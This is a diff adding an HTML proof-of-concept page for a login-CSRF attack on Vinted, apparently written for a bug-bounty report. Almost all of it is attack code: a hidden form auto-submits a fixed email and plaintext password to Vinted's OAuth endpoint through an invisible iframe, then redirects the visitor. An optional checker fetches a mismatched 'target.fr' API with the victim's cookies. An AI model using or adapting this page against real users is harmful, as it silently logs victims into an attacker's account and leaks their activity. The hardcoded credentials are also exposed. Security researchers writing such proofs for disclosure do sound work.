@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Proof of Concept</title>
+</head>
+<body>
+    <h2>Test CSRF Vinted</h2>
+    <div id="status">Prêt...</div>
+    
+    <!-- Frame pour capturer la réponse -->
+    <iframe id="responseFrame" name="responseFrame" style="display:none"></iframe>
+    
+    <!-- Formulaire CSRF -->
+    <form id="csrfForm" action="https://www.vinted.fr/web/api/auth/oauth" 
+          method="POST" target="responseFrame">
+        <input type="hidden" name="client_id" value="web">
+        <input type="hidden" name="scope" value="user">
+        <input type="hidden" name="username" value="raz_26+2@intigriti.me">
+        <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy">
+        <input type="hidden" name="grant_type" value="password">
+    </form>
+
+    <script>
+        // Créer un compte de test D'ABORD sur Vinted
+        const testAccount = {
+            email: "raz_26+2@intigriti.me",  // À CHANGER
+            password: "Vh5:U&fGd2mk:sy"         // À CHANGER
+        };
+        
+        async function executeCSRF() {
+            document.getElementById('status').innerHTML = 
+                '🚀 Envoi de la requête CSRF...';
+            
+            // 1. Soumettre le formulaire CSRF
+            document.getElementById('csrfForm').submit();
+            
+            // 2. Attendre que la requête soit traitée
+            await new Promise(resolve => setTimeout(resolve, 3000));
+            
+            // 3. Rediriger vers une page Vinted qui montre l'état
+            window.location.href = 'https://www.vinted.fr/member/general';
+            
+            // OU pour une vérification automatique :
+            // vérifierSiConnecte();
+        }
+        
+        // Fonction pour vérifier automatiquement
+        async function vérifierSiConnecte() {
+            try {
+                // Essayer d'accéder à une API protégée
+                const response = await fetch('https://www.target.fr/api/v2/users/me', {
+                    credentials: 'include' // Inclut les cookies
+                });
+                
+                if (response.ok) {
+                    const userData = await response.json();
+                    document.getElementById('status').innerHTML = 
+                        `✅ CONNECTÉ EN TANT QUE : ${userData.email || userData.username}`;
+                } else {
+                    document.getElementById('status').innerHTML = 
+                        '❌ Non connecté ou erreur';
+                }
+            } catch (error) {
+                document.getElementById('status').innerHTML = 
+                    '⚠️ Erreur de vérification';
+            }
+        }
+        
+        // Lancer l'attaque automatiquement après 2 secondes
+        setTimeout(executeCSRF, 2000);
+    </script>
+</body>
+</html>
